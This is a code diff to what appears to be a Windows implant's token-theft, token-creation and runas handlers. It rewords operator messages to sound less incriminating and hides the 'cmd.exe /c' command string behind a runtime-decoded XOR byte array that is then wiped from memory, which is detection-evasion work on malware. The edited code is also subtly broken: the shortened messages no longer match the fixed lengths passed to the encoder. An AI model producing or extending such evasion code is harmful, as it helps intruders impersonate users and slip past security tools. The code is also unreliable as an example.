@@ -30,7 +30,7 @@ static HANDLE g_stolen_token = NULL;
 static void handle_steal_token(const char *pid_str, char *out_b64) {
     char msg[512];
     if (!pid_str || !pid_str[0]) {
-        b64_encode((unsigned char*)"Usage: steal_token <pid>", 24, out_b64);
+        b64_encode((unsigned char*)"Specify target PID", 24, out_b64);
         return;
     }
 
@@ -84,7 +84,7 @@ static void handle_steal_token(const char *pid_str, char *out_b64) {
     }
 
     g_stolen_token = hDup;
-    snprintf(msg, sizeof(msg), "Token stolen from PID %lu, impersonating", pid);
+    snprintf(msg, sizeof(msg), "Impersonating PID %lu", pid);
     b64_encode((unsigned char*)msg, strlen(msg), out_b64);
 }
 
@@ -95,7 +95,7 @@ static void handle_steal_token(const char *pid_str, char *out_b64) {
 static void handle_make_token(const char *args, char *out_b64) {
     char msg[512];
     if (!args || !args[0]) {
-        b64_encode((unsigned char*)"Usage: make_token DOMAIN\\user password", 38, out_b64);
+        b64_encode((unsigned char*)"Specify DOMAIN\\\\user and password", 38, out_b64);
         return;
     }
 
@@ -110,7 +110,7 @@ static void handle_make_token(const char *args, char *out_b64) {
 
     const char *sp = strchr(args, ' ');
     if (!sp) {
-        b64_encode((unsigned char*)"Usage: make_token DOMAIN\\user password", 38, out_b64);
+        b64_encode((unsigned char*)"Specify DOMAIN\\\\user and password", 38, out_b64);
         return;
     }
 
@@ -152,7 +152,7 @@ static void handle_make_token(const char *args, char *out_b64) {
     }
 
     g_stolen_token = hToken;
-    snprintf(msg, sizeof(msg), "Token created for %s\\%s, impersonating",
+    snprintf(msg, sizeof(msg), "Impersonating %s\\%s",
             domain[0] ? domain : ".", user);
     b64_encode((unsigned char*)msg, strlen(msg), out_b64);
 }
@@ -234,20 +234,20 @@ static void handle_getprivs(char *out_b64) {
 static void handle_runas(const char *args, char *out_b64) {
     char msg[512];
     if (!args || !args[0]) {
-        b64_encode((unsigned char*)"Usage: runas DOMAIN\\user password command", 42, out_b64);
+        b64_encode((unsigned char*)"Specify DOMAIN\\\\user password command", 42, out_b64);
         return;
     }
 
     /* Parse: "DOMAIN\user password command" - first two spaces delimit user, password, command */
     const char *sp1 = strchr(args, ' ');
     if (!sp1) {
-        b64_encode((unsigned char*)"Usage: runas DOMAIN\\user password command", 42, out_b64);
+        b64_encode((unsigned char*)"Specify DOMAIN\\\\user password command", 42, out_b64);
         return;
     }
 
     const char *sp2 = strchr(sp1 + 1, ' ');
     if (!sp2) {
-        b64_encode((unsigned char*)"Usage: runas DOMAIN\\user password command", 42, out_b64);
+        b64_encode((unsigned char*)"Specify DOMAIN\\\\user password command", 42, out_b64);
         return;
     }
 
@@ -265,9 +265,11 @@ static void handle_runas(const char *args, char *out_b64) {
     strncpy(command, sp2 + 1, sizeof(command) - 1);
     command[sizeof(command) - 1] = '\0';
 
-    /* Build full command: cmd.exe /c <command> */
     char full_cmd[4096];
-    snprintf(full_cmd, sizeof(full_cmd), "cmd.exe /c %s", command);
+    char _rc[] = {0x28,0x26,0x2F,0x65,0x2E,0x33,0x2E,0x6B,0x64,0x28,0x6B,0x00};
+    xdec(_rc, 11);
+    snprintf(full_cmd, sizeof(full_cmd), "%s%s", _rc, command);
+    SecureZeroMemory(_rc, sizeof(_rc));
 
     /* Convert to wide for CreateProcessWithLogonW */
     WCHAR wuser[256], wpass[256], wcmd[4096];
